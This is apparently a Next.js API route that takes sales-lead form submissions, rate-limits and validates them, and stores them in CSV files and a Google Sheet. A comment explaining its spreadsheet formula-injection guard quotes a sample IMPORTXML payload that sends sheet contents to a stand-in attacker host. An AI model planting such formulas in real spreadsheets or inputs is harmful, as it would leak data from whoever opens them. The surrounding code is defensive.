import { NextRequest } from "next/server";
import { promises as fs } from "fs";
import path from "path";

// Use the Node.js runtime (needs fs) and never cache this handler.
export const runtime = "nodejs";
export const dynamic = "force-dynamic";

type LeadPayload = {
  action?: "submit" | "booking_opened";
  id?: string;
  package?: string;
  name?: string;
  email?: string;
  company?: string;
  website?: string;
  role?: string;
  targetMarket?: string;
  icpNotes?: string;
  avgDealSize?: string;
  salesGoals?: string;
  currentProspecting?: string;
  consent?: boolean;
  // Honeypot — must stay empty for real humans.
  hp_leave_blank?: string;
};

// On Vercel (and any serverless host) the filesystem is ephemeral: a local write
// can succeed and still be gone before anyone reads it. So a local write only
// counts as durable storage when we are NOT serverless.
const IS_SERVERLESS = Boolean(process.env.VERCEL || process.env.AWS_LAMBDA_FUNCTION_NAME);

const DATA_DIR = path.join(process.cwd(), "data");
const CSV_FILE = path.join(DATA_DIR, "submissions.csv");
const JSONL_FILE = path.join(DATA_DIR, "submissions.jsonl");
const EVENTS_FILE = path.join(DATA_DIR, "events.jsonl");

// CSV column order — also the human-readable header row.
const CSV_COLUMNS = [
  "id",
  "timestamp",
  "status",
  "package",
  "name",
  "email",
  "company",
  "website",
  "role",
  "targetMarket",
  "avgDealSize",
  "salesGoals",
  "currentProspecting",
  "icpNotes",
  "source",
  "consent",
  "consentAt",
  "ip",
] as const;

// Best-effort in-memory rate limiter (per server instance). A light deterrent,
// not a guarantee — real protection lives behind the honeypot + Sheets.
const hits = new Map<string, number[]>();
const RATE_LIMIT = 6;
const RATE_WINDOW_MS = 60_000;

function rateLimited(ip: string): boolean {
  const now = Date.now();
  // Bound memory: when the map grows, drop IPs whose window has fully expired so
  // quiet visitors don't accumulate forever on a long-lived (self-host) instance.
  if (hits.size > 500) {
    for (const [key, times] of hits) {
      const fresh = times.filter((t) => now - t < RATE_WINDOW_MS);
      if (fresh.length === 0) hits.delete(key);
      else hits.set(key, fresh);
    }
  }
  const recent = (hits.get(ip) ?? []).filter((t) => now - t < RATE_WINDOW_MS);
  recent.push(now);
  hits.set(ip, recent);
  return recent.length > RATE_LIMIT;
}

function isEmail(value: string): boolean {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
}

function csvEscape(value: unknown): string {
  const s = value == null ? "" : String(value);
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

// Spreadsheet formula injection guard.
//
// Every field below is attacker-controlled free text, and it lands in two
// spreadsheets: submissions.csv and the owner's Google Sheet. A value beginning
// with =, +, -, @ or a control character is evaluated as a FORMULA when that
// sheet is opened — so `=IMPORTXML("https://evil.example/?d="&A1,"//a")` in the
// "name" box would quietly exfiltrate the rest of the sheet to an attacker the
// moment the owner looks at their leads.
//
// Prefixing with an apostrophe forces the cell to text. Google Sheets treats a
// leading ' as a formatting directive and does not display it, so legitimate
// values still read normally.
function neutralizeFormula(value: string): string {
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
}

// 8 crypto-random base32 characters (~1.1e12 per day) instead of 4 from
// Math.random (~1.7e6 per day). The reference is quoted back to the visitor and
// is the key `markBookingOpened` matches on, so a collision would stamp the
// booking onto someone else's row.
const ID_ALPHABET = "ABCDEFGHJKMNPQRSTUVWXYZ23456789"; // no I/L/O/0/1 — read aloud safely
function genId(): string {
  const ymd = new Date().toISOString().slice(2, 10).replace(/-/g, "");
  const bytes = crypto.getRandomValues(new Uint8Array(8));
  let rand = "";
  for (const b of bytes) rand += ID_ALPHABET[b % ID_ALPHABET.length];
  return `LG-${ymd}-${rand}`;
}

function getIp(req: NextRequest): string {
  // `x-forwarded-for` is a client-settable header: taking the FIRST entry means
  // anyone can rotate `X-Forwarded-For: <random>` and reset their own rate-limit
  // bucket on every request. Vercel sets `x-real-ip` itself and appends the true
  // client address as the LAST hop of x-forwarded-for, so prefer the former and
  // fall back to the last hop — the entry closest to our own edge, and the only
  // one an upstream client cannot forge.
  const realIp = req.headers.get("x-real-ip")?.trim();
  if (realIp) return realIp;
  const hops = req.headers.get("x-forwarded-for")?.split(",") ?? [];
  const last = hops[hops.length - 1]?.trim();
  return last || "unknown";
}

async function ensureCsvHeader(): Promise<void> {
  try {
    await fs.access(CSV_FILE);
  } catch {
    await fs.writeFile(CSV_FILE, CSV_COLUMNS.join(",") + "\n", "utf8");
  }
}

async function appendLocal(record: Record<string, unknown>): Promise<boolean> {
  // Local persistence is for dev / self-host. On serverless (e.g. Vercel) the
  // filesystem is read-only/ephemeral, so this is best-effort — the Google
  // Sheet is the durable source of truth there. Returns whether the write
  // actually landed, so the caller can tell if the lead was stored ANYWHERE.
  try {
    await fs.mkdir(DATA_DIR, { recursive: true });
    await ensureCsvHeader();
    const row = CSV_COLUMNS.map((c) => csvEscape(record[c])).join(",") + "\n";
    await fs.appendFile(CSV_FILE, row, "utf8");
    await fs.appendFile(JSONL_FILE, JSON.stringify(record) + "\n", "utf8");
    return true;
  } catch (err) {
    console.warn("[lead] local persistence skipped:", (err as Error).message);
    return false;
  }
}

async function appendEvent(event: Record<string, unknown>): Promise<void> {
  try {
    await fs.mkdir(DATA_DIR, { recursive: true });
    await fs.appendFile(EVENTS_FILE, JSON.stringify(event) + "\n", "utf8");
  } catch (err) {
    console.warn("[lead] event log skipped:", (err as Error).message);
  }
}

async function forwardToSheets(
  payload: Record<string, unknown>,
): Promise<{ forwarded: boolean; ok?: boolean; status?: number }> {
  const url = process.env.SHEETS_WEBHOOK_URL;
  if (!url) {
    console.error("[lead] SHEETS_WEBHOOK_URL is not set — lead NOT forwarded to Sheet");
    return { forwarded: false };
  }
  try {
    const res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ...payload, secret: process.env.SHEETS_WEBHOOK_SECRET ?? "" }),
      signal: AbortSignal.timeout(10_000),
    });
    // Apps Script answers HTTP 200 even when it REJECTS the row (a wrong or missing
    // secret returns 200 with {"ok":false,"error":"unauthorized"}), so `res.ok` alone
    // reports a dropped lead as a stored one. The body is the only honest signal:
    // treat the row as stored only when the script actually says ok:true.
    const body = await res.text().catch(() => "");
    let accepted = false;
    try {
      accepted = (JSON.parse(body) as { ok?: boolean }).ok === true;
    } catch {
      // A non-JSON body means Apps Script returned an HTML error/login page —
      // usually a deployment whose access is not set to "Anyone". Not accepted.
      accepted = false;
    }
    if (!accepted) {
      console.error(
        `[lead] Sheets webhook REJECTED the write status=${res.status} body=${body.slice(0, 300)}`,
      );
    }
    return { forwarded: true, ok: accepted, status: res.status };
  } catch (err) {
    console.error("[lead] Sheets forward failed:", (err as Error).message);
    return { forwarded: true, ok: false };
  }
}

// The largest legitimate submission is a few KB (every field is length-capped
// below). Reject anything bigger before parsing so a huge body can't be used to
// burn function memory/time.
const MAX_BODY_BYTES = 16_000;

// Reject obvious cross-site posts. `Sec-Fetch-Site` is set by the browser and
// cannot be forged from page JavaScript, so it is the reliable signal; the Origin
// check is the fallback for the handful of clients that don't send it. This is a
// spam/abuse deterrent rather than a security boundary — the endpoint writes no
// authenticated state — but it cheaply blocks the "embed a form on another site
// and post at them" pattern that CORS never prevents.
function isCrossSitePost(req: NextRequest): boolean {
  const site = req.headers.get("sec-fetch-site");
  if (site) return site === "cross-site";
  const origin = req.headers.get("origin");
  if (!origin) return false; // non-browser client (curl, uptime check) — allowed
  try {
    return new URL(origin).host !== req.headers.get("host");
  } catch {
    return true;
  }
}

export async function POST(req: NextRequest) {
  if (isCrossSitePost(req)) {
    return Response.json({ ok: false, error: "Invalid request origin." }, { status: 403 });
  }

  const declaredLength = Number(req.headers.get("content-length") ?? 0);
  if (declaredLength > MAX_BODY_BYTES) {
    return Response.json({ ok: false, error: "Request too large." }, { status: 413 });
  }

  let body: LeadPayload;
  try {
    const raw = await req.text();
    if (raw.length > MAX_BODY_BYTES) {
      return Response.json({ ok: false, error: "Request too large." }, { status: 413 });
    }
    const parsed: unknown = JSON.parse(raw);
    // Guard against `null`, arrays, and primitives — all valid JSON, none of which
    // are safe to index into as a payload object.
    if (parsed === null || typeof parsed !== "object" || Array.isArray(parsed)) {
      return Response.json({ ok: false, error: "Invalid request body." }, { status: 400 });
    }
    body = parsed as LeadPayload;
  } catch {
    return Response.json({ ok: false, error: "Invalid request body." }, { status: 400 });
  }

  const ip = getIp(req);
  const action = body.action ?? "submit";

  // Rate-limit first so honeypot/bot spam is also counted against the limit.
  if (rateLimited(ip)) {
    return Response.json(
      { ok: false, error: "Too many requests. Please try again in a moment." },
      { status: 429 },
    );
  }

  // Honeypot: bots fill hidden fields. Return a fake success so they move on.
  //
  // The field is `hp_leave_blank`, NOT `company_website`. Chrome ignores
  // autocomplete="off" on contact-shaped fields, and this form also has a REAL
  // `website` input - so a browser that autofilled a hidden `company_website`
  // would trip this branch for a real person and hand them a fake success while
  // the lead was discarded. A discard is also recorded: a silent filter with no
  // counter cannot be audited after the fact.
  if (body.hp_leave_blank) {
    await appendEvent({ type: "honeypot_discard", timestamp: new Date().toISOString(), ip });
    return Response.json({ ok: true, id: genId() });
  }

  // Lightweight tracking event when a lead reaches/opens the booking step.
  if (action === "booking_opened") {
    const id = String(body.id ?? "").slice(0, 40);
    // booking_opened is an untrusted client signal; only record well-formed ids
    // (as minted by genId) so bots can't inject noise into the event log / Sheet.
    if (!/^LG-\d{6}-[A-Z0-9]{2,8}$/.test(id)) {
      return Response.json({ ok: true });
    }
    const timestamp = new Date().toISOString();
    await appendEvent({ type: "booking_opened", id, timestamp, ip });
    await forwardToSheets({ action: "booking_opened", id, timestamp });
    return Response.json({ ok: true });
  }

  // action === "submit"
  // Deliberately short. Everything here is either needed to reply (name, email,
  // company) or needed to judge fit before the call (market, deal size, current
  // approach). "What does success look like" is a genuinely useful answer but it
  // is an essay standing between a visitor and the booking link, so it is asked
  // and kept optional — the call covers it either way.
  const required: Array<[keyof LeadPayload, string]> = [
    ["name", "Name"],
    ["email", "Work email"],
    ["company", "Company"],
    ["targetMarket", "Target market"],
    ["avgDealSize", "Average job value"],
    ["currentProspecting", "Current prospecting method"],
  ];
  const missing = required
    .filter(([key]) => !String(body[key] ?? "").trim())
    .map(([, label]) => label);
  if (missing.length) {
    return Response.json(
      { ok: false, error: `Please complete: ${missing.join(", ")}.` },
      { status: 400 },
    );
  }
  if (!isEmail(String(body.email))) {
    return Response.json({ ok: false, error: "Please enter a valid work email." }, { status: 400 });
  }
  if (body.consent !== true) {
    return Response.json(
      { ok: false, error: "Please confirm you're happy to be contacted about your enquiry." },
      { status: 400 },
    );
  }

  const id = genId();
  const timestamp = new Date().toISOString();

  // Trim, cap length, then neutralize any leading formula character before the
  // value reaches a spreadsheet.
  const field = (value: unknown, max: number): string =>
    neutralizeFormula(String(value ?? "").trim().slice(0, max));

  const record: Record<string, string> = {
    id,
    timestamp,
    status: "New",
    package: field(body.package ?? "Not specified", 60),
    name: field(body.name, 120),
    email: field(body.email, 160),
    company: field(body.company, 160),
    website: field(body.website, 200),
    role: field(body.role, 120),
    targetMarket: field(body.targetMarket, 400),
    avgDealSize: field(body.avgDealSize, 80),
    salesGoals: field(body.salesGoals, 800),
    currentProspecting: field(body.currentProspecting, 800),
    icpNotes: field(body.icpNotes, 1500),
    source: "website",
    // Proof of consent. It was validated on the way in and then dropped, so nothing
    // downstream could show WHEN a contact agreed to be contacted - the one record
    // you need if a recipient ever disputes it.
    consent: "true",
    consentAt: timestamp,
    // `ip` derives from client-settable headers, so it is attacker-controlled free
    // text and takes the same formula guard as every visible field.
    ip: neutralizeFormula(ip),
  };

  const localOk = await appendLocal(record);
  const sheet = await forwardToSheets({ action: "submit", ...record });

  // `stored` is the honest answer to "did this lead survive the request?".
  // On Vercel the filesystem is ephemeral, so the Sheet is the only durable sink
  // there and localOk alone must never be read as success.
  const stored = sheet.ok === true || (localOk && !IS_SERVERLESS);
  if (!stored) {
    console.error(
      `[lead] LEAD ${id} WAS NOT STORED ANYWHERE (sheetForwarded=${sheet.forwarded}, sheetOk=${sheet.ok === true}, sheetStatus=${sheet.status ?? "n/a"}, localOk=${localOk}). ` +
        `Check SHEETS_WEBHOOK_URL / SHEETS_WEBHOOK_SECRET in the deployment's environment variables.`,
    );
  }

  // Still `ok: true` — the visitor did nothing wrong and their next step (booking a
  // time) is what actually matters, and a calendar booking captures their details
  // independently of the Sheet. `stored` lets the UI tell them the truth and steer
  // them to that booking rather than silently losing them.
  return Response.json({
    ok: true,
    id,
    stored,
    sheets: sheet.ok === true,
    sheetStatus: sheet.status ?? null,
  });
}
